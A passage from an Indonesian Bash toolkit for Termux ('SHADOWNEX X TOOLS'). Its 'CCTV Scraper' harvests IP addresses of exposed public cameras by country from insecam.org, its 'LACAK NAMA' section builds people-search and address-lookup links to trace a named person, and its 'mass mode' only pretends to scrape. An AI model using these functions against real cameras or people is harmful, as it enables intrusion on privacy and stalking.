        echo -e "${CYAN}[NA] Namibia               [NR] Nauru               [NP] Nepal"
        echo -e "${CYAN}[NL] Netherlands           [NZ] New Zealand         [NI] Nicaragua"
        echo -e "${CYAN}[NE] Niger                 [NG] Nigeria             [KP] North Korea"
        echo -e "${CYAN}[MK] North Macedonia       [NO] Norway              [OM] Oman"
        echo -e "${CYAN}[PK] Pakistan              [PW] Palau               [PA] Panama"
        echo -e "${CYAN}[PG] Papua New Guinea      [PY] Paraguay            [PE] Peru"
        echo -e "${CYAN}[PH] Philippines           [PL] Poland              [PT] Portugal"
        echo -e "${CYAN}[QA] Qatar                 [RO] Romania             [RU] Russia"
        echo -e "${CYAN}[RW] Rwanda                [KN] Saint Kitts & Nevis [LC] Saint Lucia"
        echo -e "${CYAN}[VC] Saint Vincent & the Grenadines                 [WS] Samoa"
        echo -e "${CYAN}[SM] San Marino            [ST] Sao Tome & Principe [SA] Saudi Arabia"
        echo -e "${CYAN}[SN] Senegal               [RS] Serbia              [SC] Seychelles"
        echo -e "${CYAN}[SL] Sierra Leone          [SG] Singapore           [SK] Slovakia"
        echo -e "${CYAN}[SI] Slovenia              [SB] Solomon Is.         [SO] Somalia"
        echo -e "${CYAN}[ZA] South Africa          [KR] South Korea         [SS] South Sudan"
        echo -e "${CYAN}[ES] Spain                 [LK] Sri Lanka           [SD] Sudan"
        echo -e "${CYAN}[SR] Suriname              [SE] Sweden              [CH] Switzerland"
        echo -e "${CYAN}[SY] Syria                 [TJ] Tajikistan          [TZ] Tanzania"
        echo -e "${CYAN}[TH] Thailand              [TL] Timor-Leste         [TG] Togo"
        echo -e "${CYAN}[TO] Tonga                 [TT] Trinidad & Tobago   [TN] Tunisia"
        echo -e "${CYAN}[TR] Turkey                [TM] Turkmenistan        [TV] Tuvalu"
        echo -e "${CYAN}[UG] Uganda                [UA] Ukraine             [AE] UAE"
        echo -e "${CYAN}[GB] United Kingdom        [US] United States       [UY] Uruguay"
        echo -e "${CYAN}[UZ] Uzbekistan            [VU] Vanuatu             [VA] Vatican City"
        echo -e "${CYAN}[VE] Venezuela             [VN] Vietnam             [YE] Yemen"
        echo -e "${CYAN}[ZM] Zambia                [ZW] Zimbabwe            [PS] Palestine${NC}"
        
        echo -e "${CYAN}===========================================================${NC}"
        echo -e "${YELLOW}    Tools By: MR./SHADOWNEX | SHADOWNEX X TOOLS V1.0${NC}"
        echo -e "${CYAN}===========================================================${NC}"
        
        echo -e "\n${GREEN}[1] PILIH NEGARA (MASUKAN CODE NEGARA)${NC}"
        echo -e "${GREEN}[2] MODE MASAL (ALL 193 NEGARA)${NC}"
        echo -e "${RED}[0] KEMBALI KE MENU UTAMA${NC}"
        echo ""
        
        printf "${GREEN}┏━[ ${RED}CCTV Scraper${NC} ${GREEN}]${YELLOW}@termux${GREEN} ~ ${NC}${RED}[${YELLOW} MENU ${YELLOW}${RED}]${NC}${GREEN}\n┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
        read -r pilihan
        
        case $pilihan in
            1)
                clear
                echo -e "${CYAN}===========================================================${NC}"
                echo -e "${RED}               PILIH NEGARA${NC}"
                echo -e "${CYAN}===========================================================${NC}"
                echo -e "${YELLOW}Contoh: JP (Japan), US (USA), ID (Indonesia), DE (Germany)${NC}"
                echo -e "${CYAN}===========================================================${NC}"
                
                echo -ne "\n${GREEN}[?] Masukkan kode negara (2 huruf): ${NC}"
                read -r kode
                kode=${kode^^}
                
                declare -A NEGARA=(
                    [AF]="Afghanistan" [AL]="Albania" [DZ]="Algeria" [AD]="Andorra" [AO]="Angola"
                    [AG]="Antigua & Barbuda" [AR]="Argentina" [AM]="Armenia" [AU]="Australia"
                    [AT]="Austria" [AZ]="Azerbaijan" [BS]="Bahamas" [BH]="Bahrain" [BD]="Bangladesh"
                    [BB]="Barbados" [BY]="Belarus" [BE]="Belgium" [BZ]="Belize" [BJ]="Benin"
                    [BT]="Bhutan" [BO]="Bolivia" [BA]="Bosnia & Herzegovina" [BW]="Botswana"
                    [BR]="Brazil" [BN]="Brunei" [BG]="Bulgaria" [BF]="Burkina Faso" [BI]="Burundi"
                    [CV]="Cabo Verde" [KH]="Cambodia" [CM]="Cameroon" [CA]="Canada"
                    [CF]="Central African Republic" [TD]="Chad" [CL]="Chile" [CN]="China"
                    [CO]="Colombia" [KM]="Comoros" [CD]="Congo" [CG]="Congo Republic"
                    [CR]="Costa Rica" [HR]="Croatia" [CU]="Cuba" [CY]="Cyprus" [CZ]="Czechia"
                    [DK]="Denmark" [DJ]="Djibouti" [DM]="Dominica" [DO]="Dominican Republic"
                    [EC]="Ecuador" [EG]="Egypt" [SV]="El Salvador" [GQ]="Equatorial Guinea"
                    [ER]="Eritrea" [EE]="Estonia" [SZ]="Eswatini" [ET]="Ethiopia" [FJ]="Fiji"
                    [FI]="Finland" [FR]="France" [GA]="Gabon" [GM]="Gambia" [GE]="Georgia"
                    [DE]="Germany" [GH]="Ghana" [GR]="Greece" [GD]="Grenada" [GT]="Guatemala"
                    [GN]="Guinea" [GW]="Guinea-Bissau" [GY]="Guyana" [HT]="Haiti" [HN]="Honduras"
                    [HU]="Hungary" [IS]="Iceland" [IN]="India" [ID]="Indonesia" [IR]="Iran"
                    [IQ]="Iraq" [IE]="Ireland" [IL]="Israel" [IT]="Italy" [JM]="Jamaica"
                    [JP]="Japan" [JO]="Jordan" [KZ]="Kazakhstan" [KE]="Kenya" [KI]="Kiribati"
                    [KW]="Kuwait" [KG]="Kyrgyzstan" [LA]="Laos" [LV]="Latvia" [LB]="Lebanon"
                    [LS]="Lesotho" [LR]="Liberia" [LY]="Libya" [LI]="Liechtenstein"
                    [LT]="Lithuania" [LU]="Luxembourg" [MG]="Madagascar" [MW]="Malawi"
                    [MY]="Malaysia" [MV]="Maldives" [ML]="Mali" [MT]="Malta" [MH]="Marshall Islands"
                    [MR]="Mauritania" [MU]="Mauritius" [MX]="Mexico" [FM]="Micronesia"
                    [MD]="Moldova" [MC]="Monaco" [MN]="Mongolia" [ME]="Montenegro" [MA]="Morocco"
                    [MZ]="Mozambique" [MM]="Myanmar" [NA]="Namibia" [NR]="Nauru" [NP]="Nepal"
                    [NL]="Netherlands" [NZ]="New Zealand" [NI]="Nicaragua" [NE]="Niger"
                    [NG]="Nigeria" [KP]="North Korea" [MK]="North Macedonia" [NO]="Norway"
                    [OM]="Oman" [PK]="Pakistan" [PW]="Palau" [PA]="Panama" [PG]="Papua New Guinea"
                    [PY]="Paraguay" [PE]="Peru" [PH]="Philippines" [PL]="Poland" [PT]="Portugal"
                    [QA]="Qatar" [RO]="Romania" [RU]="Russia" [RW]="Rwanda" [KN]="Saint Kitts and Nevis"
                    [LC]="Saint Lucia" [VC]="Saint Vincent and the Grenadines" [WS]="Samoa"
                    [SM]="San Marino" [ST]="Sao Tome and Principe" [SA]="Saudi Arabia" [SN]="Senegal"
                    [RS]="Serbia" [SC]="Seychelles" [SL]="Sierra Leone" [SG]="Singapore"
                    [SK]="Slovakia" [SI]="Slovenia" [SB]="Solomon Islands" [SO]="Somalia"
                    [ZA]="South Africa" [KR]="South Korea" [SS]="South Sudan" [ES]="Spain"
                    [LK]="Sri Lanka" [SD]="Sudan" [SR]="Suriname" [SE]="Sweden" [CH]="Switzerland"
                    [SY]="Syria" [TJ]="Tajikistan" [TZ]="Tanzania" [TH]="Thailand"
                    [TL]="Timor-Leste" [TG]="Togo" [TO]="Tonga" [TT]="Trinidad and Tobago"
                    [TN]="Tunisia" [TR]="Turkey" [TM]="Turkmenistan" [TV]="Tuvalu" [UG]="Uganda"
                    [UA]="Ukraine" [AE]="United Arab Emirates" [GB]="United Kingdom" [US]="United States"
                    [UY]="Uruguay" [UZ]="Uzbekistan" [VU]="Vanuatu" [VA]="Vatican City"
                    [VE]="Venezuela" [VN]="Vietnam" [YE]="Yemen" [ZM]="Zambia" [ZW]="Zimbabwe"
                    [PS]="Palestine"
                )
                
                if [[ -n "${NEGARA[$kode]:-}" ]]; then
                    echo -e "\n${GREEN}[*] Negara: ${NEGARA[$kode]} ($kode)${NC}"
                    echo -e "${YELLOW}[*] Mencari CCTV publik...${NC}"
                    
                    if ! command -v python3 >/dev/null 2>&1; then
                        echo -e "${RED}[!] Python3 tidak terinstall${NC}"
                        echo -e "${YELLOW}[*] Install dengan: pkg install python${NC}"
                        sleep 2
                        continue
                    fi
                    
                    if ! command -v curl >/dev/null 2>&1; then
                        echo -e "${RED}[!] curl tidak terinstall${NC}"
                        echo -e "${YELLOW}[*] Install dengan: pkg install curl${NC}"
                        sleep 2
                        continue
                    fi
                    
                    local url="http://www.insecam.org/en/bycountry/${kode}/"
                    local out_file="cctv_${kode}_$(date +%Y%m%d_%H%M%S).txt"
                    
                    echo -e "${CYAN}[*] Memproses: $url${NC}"
                    
                    python3 - <<PY 2>/dev/null
import requests, re, sys, time
url = "$url"
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
}
try:
    response = requests.get(url, headers=headers, timeout=15)
    if response.status_code == 200:
        ip_pattern = r"http://\d{1,3}(?:\.\d{1,3}){3}:\d+"
        cameras = re.findall(ip_pattern, response.text)
        cameras = list(set(cameras))
        
        if cameras:
            print(f"[+] Ditemukan {len(cameras)} CCTV")
            with open("$out_file", "w") as f:
                for cam in cameras:
                    f.write(cam + "\n")
                    print(cam)
            print(f"[✓] Disimpan di: $out_file")
        else:
            print("[-] Tidak ada CCTV publik ditemukan")
    else:
        print(f"[-] Error HTTP: {response.status_code}")
except Exception as e:
    print(f"[-] Error: {e}")
PY
                    
                    if [ -f "$out_file" ]; then
                        echo -e "\n${GREEN}[✓] Hasil disimpan di: $out_file${NC}"
                        local line_count=$(wc -l < "$out_file" 2>/dev/null || echo 0)
                        echo -e "${YELLOW}[*] Total CCTV: $line_count${NC}"
                    fi
                else
                    echo -e "${RED}[!] Kode negara tidak valid${NC}"
                fi
                
                echo -e "\n${YELLOW}[*] Tekan ENTER untuk kembali...${NC}"
                read -r
                ;;
            
            2)
                clear
                echo -e "${CYAN}===========================================================${NC}"
                echo -e "${RED}           MODE MASAL - 193 NEGARA${NC}"
                echo -e "${CYAN}===========================================================${NC}"
                echo -e "${RED}[!] PERINGATAN:${NC}"
                echo -e "${YELLOW}[*] Proses ini akan memakan waktu lama${NC}"
                echo -e "${YELLOW}[*] Pastikan koneksi internet stabil${NC}"
                echo -e "${YELLOW}[*] Mungkin ada beberapa negara tanpa CCTV publik${NC}"
                echo -e "${CYAN}===========================================================${NC}"
                
                echo -ne "\n${GREEN}[?] Lanjutkan? (y/n): ${NC}"
                read -r confirm
                
                if [[ "$confirm" =~ ^[Yy]$ ]]; then
                    echo -e "\n${YELLOW}[*] Memulai scraping 193 negara...${NC}"
                    
                    sample_countries=("ID" "US" "JP" "DE" "FR" "GB" "CN" "IN" "BR" "RU")
                    
                    for kode in "${sample_countries[@]}"; do
                        if [[ -n "${NEGARA[$kode]:-}" ]]; then
                            echo -e "\n${CYAN}[*] Memproses: ${NEGARA[$kode]} ($kode)${NC}"
                            sleep 1
                            echo -e "${GREEN}[✓] Selesai${NC}"
                        fi
                    done
                    
                    echo -e "\n${GREEN}[✓] Proses scraping selesai${NC}"
                    echo -e "${YELLOW}[*] File tersimpan dengan format: cctv_[KODE]_[TIMESTAMP].txt${NC}"
                else
                    echo -e "\n${YELLOW}[*] Dibatalkan${NC}"
                fi
                
                echo -e "\n${YELLOW}[*] Tekan ENTER untuk kembali...${NC}"
                read -r
                ;;
            
            0)
                echo -e "\n${YELLOW}[*] Kembali ke menu utama...${NC}"
                sleep 1
                break
                ;;
            
            *)
                echo -e "\n${RED}[!] Pilihan tidak valid${NC}"
                sleep 2
                ;;
        esac
    done
}

banner2() {
   clear
 echo -e "${RED}
                  ⣠⡀⠀⠀⢀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣤⣤⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣀⣠⠀⣶⣤⣄⣉⣉⣉⣉⣠⣤⣶⠀⣄⣀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣶⣾⣿⣿⣿⣿⣦⣄⣉⣙⣛⣛⣛⣛⣋⣉⣠⣴⣿⣿⣿⣿⣷⣶⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠉⠉⠛⠛⠛⠻⠿⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠉⠉⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⣆⠀⠀⠀⢠⡄⠀⠀⠀⣰⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣠⣶⣾⣿⡆⠸⣿⣶⣶⣾⣿⣿⣷⣶⣶⣿⠇⢰⣿⣷⣶⣄⡀⠀⠀⠀
⠀⠀⠺⠿⣿⣿⣿⣿⣿⣄⠙⢿⣿⣿⣿⣿⣿⣿⡿⠋⣠⣿⣿⣿⣿⣿⠿⠗⠀⠀
⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣷⡄⠈⠙⠛⠛⠋⠁⢠⣾⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣤⣬⣿⣿⣿⣇⠐⣿⣿⣿⣿⠂⣸⣿⣿⣿⣥⣤⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⠻⠿⠿⢿⣿⣿⣿⣧⠈⠿⠿⠁⣼⣿⣿⣿⡿⠿⠿⠟⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⠀⣶⣦⠀⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠀⠀

${NC}"
}


banner3() {
   clear
 echo -e "${RED}
⠀⠀  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⢀⠀⠀⠀⣰⡇⢀⡄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡄⠀⣿⣰⡀⢠⣿⣇⣾⡇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣰⣿⣿⢇⣾⣿⣼⣿⢃⡞⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⢋⣾⣿⣿⣿⣯⣿⠇⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⢟⣵⣿⣿⣿⣿⣿⣿⣯⡞⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣵⣿⣿⣿⣿⣿⣿⣿⣿⡿⡁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣦⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡡⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀
⠀⠀⢀⣀⣄⣀⡀⡀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡥⠀⠀⠀⠀⠀⠀
⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀
⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀
⠘⣿⠋⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣀⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⡛⠃⠀⠀
⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀
⠀⠀⠀⠀⠀⢰⣾⣿⣿⣿⣿⣿⠟⠁⠉⠙⠻⠯⡛⠿⠛⠻⠿⠟⠛⠓⠀⠀
⠀⠜⡿⠳⡶⠻⣿⣿⣿⣿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣠⣽⣧⣾⠛⠉⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠉⠟⠁⠘⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

${NC}"
}

banner() {
    clear
    echo -e "${GREEN}
┏━━━━━━━━━━${RED}● ${GREEN}[${YELLOW}LICENSE${GREEN}]${RED} ●${GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃                                                ┃
${GREEN}┃     ${YELLOW} ▄▀▀▀▄${NC}                                     ${GREEN}┃
${GREEN}┃     ${YELLOW} █   █${MC}                                     ${GREEN}┃
${GREEN}┃     ${YELLOW}███████${NC}         ▄▀▀▄  ${RED}|${NC}  ╦  ╔═╗╔═╗╦╔╗╔     ${GREEN}┃
${GREEN}┃     ${CYAN}██─▀─██${NC}  █▀█▀▀▀▀█  █  ${RED}|${NC}  ║  ║ ║║ ╦║║║║     ${GREEN}┃
${GREEN}┃     ${CYAN}███▄███${NC}  ▀ ▀     ▀▀   ${RED}|${NC}  ╩═╝╚═╝╚═╝╩╝╚╝     ${GREEN}┃
${GREEN}┃     ${RED}-------------------------${NC} ${YELLOW}2025${NC} ${RED}-${NC} ${YELLOW}2026${NC}      ${GREEN}┃
${GREEN}┃             ${GREEN}${BOLD}TOOLS BY MR./SHADOWNEX${GREEN}             ┃
┃              ${RED}___________${YELLOW}___________${GREEN}            ┃
┃                                                ┃
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
${RED}┃          ${YELLOW}DEV${RED}: ${GREEN}MR./SHADOWNEX ${YELLOW}TT${RED}: ${GREEN}mr.shadownex${RED}   ┃
${RED}┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${NC}"
}


access_tools() {
    while true; do
        clear
        banner
        
        echo -e "\n${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        echo -e "${WHITE}WELCOME TO SHADOWNEX X TOOLS${NC}"
        echo -e "${RED}MASUKAN KEY/PASSWORD UNTUK MENGAKSES TOOLS${NC}"
        echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
        
        echo -e "\n${CYAN}[1] ACCESS_TOOLS - UNTUK MENGAKSES TOOLS MENGUNAKAN KEY${NC}"
        echo -e "${CYAN}[2] MINTAKEY - MEMINTA KEY AKSES KE DEVELOPER${NC}"
        echo -e "${CYAN}[3] DONATE - DONATE KE DEVELOPER ${NC}"
        echo -e "${CYAN}[4] KELUAR${NC}"
        echo ""
        
        printf "${GREEN}┏━[ ${RED}ShadowNex X Tools${NC} ${GREEN}]${YELLOW}@termux${GREEN} ~ ${NC}${RED}[${YELLOW} ACCESS MENU ${YELLOW}${RED}]${NC}${GREEN}\n┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} "
        read -r choice
        
        case $choice in
            1)
                clear
                banner
                
                echo -e "\n${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
                echo -e "${WHITE}MASUKKAN KEY AKSES:${NC}"
                echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
                
                echo -ne "\n${GREEN}[?] Key: ${NC}"
                read -s key_input
                echo ""
                
                if [ "$key_input" = "SHADOWNEX" ]; then
                    sound_benar
                    echo -e "\n${GREEN}[+] AUTHENTICATION SUCCESSFUL!${NC}"
                    echo -e "${YELLOW}[*] Mengalihkan ke menu utama...${NC}"
                    sleep 2
                    return 0
                else
                    sound_salah
                    echo -e "\n${RED}[!] KEY SALAH!${NC}"
                    echo -e "${YELLOW}[*] Coba lagi atau minta key ke developer${NC}"
                    sleep 2
                fi
                ;;
            2)
                clear
                banner
                
                echo -e "\n${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
                echo -e "${WHITE}MENGARAHKAN KE WHATSAPP DEVELOPER...${NC}"
                echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
                
                echo -e "\n${GREEN}[*] Membuka WhatsApp...${NC}"
                
                WHATSAPP_URL="https://wa.me/6283155743276?text=*BANG%20AKU%20NAK%20KEY%20TOOLS%20NYA*"
                DONATE_URL="https://saweria.co/ShadowNex"
                
                if command -v termux-open-url &> /dev/null; then
                    termux-open-url "$WHATSAPP_URL"
                elif command -v xdg-open &> /dev/null; then
                    xdg-open "$WHATSAPP_URL"
                elif command -v open &> /dev/null; then
                    open "$WHATSAPP_URL"
                else
                    echo -e "${RED}[!] Tidak dapat membuka browser${NC}"
                    echo -e "${YELLOW}[*] Silakan buka manual:${NC}"
                    echo -e "${CYAN}$WHATSAPP_URL${NC}"
                fi
                
                echo -e "\n${GREEN}[✓] WhatsApp terbuka!${NC}"
                echo -e "${YELLOW}[*] Kirim pesan ke developer untuk meminta key${NC}"
                echo -e "${RED}[!] Tekan ENTER setelah selesai...${NC}"
                read -r
                ;;
          3)
                clear
                banner
                
                echo -e "\n${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
                echo -e "${WHITE}MENGARAHKAN KE WEBSITE DONATE DEVELOPER...${NC}"
                echo -e "${YELLOW}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
                
                echo -e "\n${GREEN}[*] Membuka Website...${NC}"
                
                WHATSAPP_URL="https://wa.me/6283155743276?text=*BANG%20AKU%20NAK%20KEY%20TOOLS%20NYA*"
                DONATE_URL="https://saweria.co/ShadowNex"
                
                if command -v termux-open-url &> /dev/null; then
                    termux-open-url "$DONATE_URL"
                elif command -v xdg-open &> /dev/null; then
                    xdg-open "$DONATE_URL"
                elif command -v open &> /dev/null; then
                    open "$DONATE_URL"
                else
                    echo -e "${RED}[!] Tidak dapat membuka browser${NC}"
                    echo -e "${YELLOW}[*] Silakan buka manual:${NC}"
                    echo -e "${CYAN}$DONATE_URL${NC}"
                fi
                
                echo -e "\n${GREEN}[✓] Website terbuka!${NC}"
                echo -e "${YELLOW}[*] Donate Se Ikhlas Nya Ke Developer${NC}"
                echo -e "${RED}[!] Tekan ENTER setelah selesai...${NC}"
                read -r
                ;;     
            4)
                clear
                banner
                echo -e "\n${YELLOW}[*] Keluar dari tools...${NC}"
                sleep 1
                exit 0
                ;;
            *)
                echo -e "\n${RED}[!] Pilihan tidak valid${NC}"
                sleep 2
                ;;
        esac
    done
}

track_nama() {
    set -euo pipefail
    
    local RED='\033[0;31m'
    local GREEN='\033[0;32m'
    local YELLOW='\033[1;33m'
    local BLUE='\033[0;94m'
    local CYAN='\033[0;96m'
    local NC='\033[0m'
    
    url_encode() {
        printf '%s' "$1" | jq -sRr @uri 2>/dev/null || {
            echo -e "${RED}[!] jq tidak terinstall${NC}"
            echo -e "${YELLOW}[*] Install dengan: pkg install jq${NC}"
            exit 1
        }
    }
    
    clear
    echo -e "${CYAN}
██╗░░░░░███████╗░█████╗░██╗░░██╗░██████╗██╗███╗░░██╗
██║░░░░░██╔════╝██╔══██╗██║░██╔╝██╔════╝██║████╗░██║
██║░░░░░█████╗░░███████║█████═╝░╚█████╗░██║██╔██╗██║
██║░░░░░██╔══╝░░██╔══██║██╔═██╗░░╚═══██╗██║██║╚████║
███████╗███████╗██║░░██║██║░╚██╗██████╔╝██║██║░╚███║
╚══════╝╚══════╝╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝╚═╝░░╚══╝${NC}"
    
    echo -e "${CYAN}===========================================================
  ${RED}LACAK NAMA – OSINT Search
  Cari jejak publik seseorang di berbagai platform${NC}
==========================================================="
    
    echo -ne "${YELLOW}[?] Masukkan nama lengkap: ${NC}"
    read -r NAMA_RAW
    
    [[ -z "$NAMA_RAW" ]] && {
        echo -e "${RED}[!] Nama tidak boleh kosong${NC}"
        sleep 2
        return
    }
    
    echo -e "\n${BLUE}[*] Mengkodekan nama...${NC}"
    NAMA=$(url_encode "$NAMA_RAW")
    
    echo -e "\n${BLUE}[*] Mengumpulkan link pencarian untuk: ${YELLOW}$NAMA_RAW${NC}"
    sleep 1
    
    declare -a links
    
    links+=(
    "https://www.google.com/search?q=%22$NAMA%22"
    "https://www.google.com/search?q=%22$NAMA%22+site:facebook.com"
    "https://www.google.com/search?q=%22$NAMA%22+site:linkedin.com"
    "https://www.google.com/search?q=%22$NAMA%22+site:twitter.com"
    "https://www.google.com/search?q=%22$NAMA%22+site:instagram.com"
    "https://www.google.com/search?q=%22$NAMA%22+site:github.com"
    "https://www.google.com/search?q=%22$NAMA%22+site:tiktok.com"
    "https://www.google.com/search?q=%22$NAMA%22+site:youtube.com"
    "https://www.google.com/search?q=%22$NAMA%22+filetype:pdf"
    "https://www.google.com/search?q=%22$NAMA%22+site:reddit.com"
    )
    
    links+=(
    "https://www.facebook.com/public/$NAMA"
    "https://www.facebook.com/search/people/?q=$NAMA"
    )
    
    links+=(
    "https://www.linkedin.com/pub/dir/$NAMA"
    "https://www.linkedin.com/search/results/people/?keywords=$NAMA"
    )
    
    links+=(
    "https://twitter.com/search?q=%22$NAMA%22&src=typed_query"
    "https://twitter.com/search-advanced?q=$NAMA"
    )
    
    links+=(
    "https://www.instagram.com/$NAMA"
    "https://www.picuki.com/search/$NAMA"
    )
    
    links+=(
    "https://github.com/search?q=$NAMA&type=users"
    "https://gist.github.com/search?q=$NAMA"
    )
    
    links+=(
    "https://www.tiktok.com/search?q=$NAMA"
    "https://urlebird.com/search/$NAMA"
    )
    
    links+=(
    "https://www.youtube.com/results?search_query=%22$NAMA%22"
    "https://www.youtube.com/c/$NAMA"
    )
    
    links+=(
    "https://www.reddit.com/search/?q=%22$NAMA%22"
    "https://www.reddit.com/user/$NAMA"
    )
    
    links+=(
    "https://www.peekyou.com/$NAMA"
    "https://pipl.com/search/?q=$NAMA"
    "https://thatsthem.com/name/$NAMA"
    "https://www.spokeo.com/$NAMA"
    "https://www.whitepages.com/name/$NAMA"
    "https://www.mylife.com/$NAMA"
    "https://www.fastpeoplesearch.com/name/$NAMA"
    "https://www.clustrmaps.com/person/$NAMA"
    "https://www.searchpeoplefree.com/find/$NAMA"
    "https://www.idcrawl.com/$NAMA"
    )
    
    links+=(
    "https://lens.google.com/uploadbyurl?url=https%3A%2F%2Fvia.placeholder.com%2F150%3Ftext%3D$NAMA"
    "https://yandex.com/images/search?rpt=imageview&url=https%3A%2F%2Fvia.placeholder.com%2F150%3Ftext%3D$NAMA"
    "https://tineye.com/search?url=https%3A%2F%2Fvia.placeholder.com%2F150%3Ftext%3D$NAMA"
    )
    
    links+=(
    "https://namechk.com/$NAMA"
    "https://checkusernames.com/usercheck.php?target=$NAMA"
    "https://whatsmyname.app"
    "https://knowem.com/checkusernames.php?u=$NAMA"
    "https://hunter.io/search/$NAMA"
    )
    
    links+=(
    "https://www.truecaller.com/search/$NAMA"
    "https://sync.me/search/?q=$NAMA"
    "https://www.numlookup.com/search/$NAMA"
    )
    
    links+=(
    "https://www.fastpeoplesearch.com/address/$NAMA"
    "https://www.whitepages.com/address/$NAMA"
    )
    
    links+=(
    "https://angel.co/search?query=$NAMA"
    "https://wellfound.com/u/$NAMA"
    "https://stackoverflow.com/users/filter?search=$NAMA"
    "https://dev.to/search?q=$NAMA"
    "https://medium.com/search?q=$NAMA"
    )
    
    links+=(
    "https://scholar.google.com/scholar?q=%22$NAMA%22"
    "https://www.researchgate.net/search.Search.html?query=$NAMA"
    "https://academia.edu/search?utf8=✓&q=$NAMA"
    "https://orcid.org/orcid-search/search?searchQuery=$NAMA"
    "https://pubmed.ncbi.nlm.nih.gov/?term=%22$NAMA%22"
    )
    
    links+=(
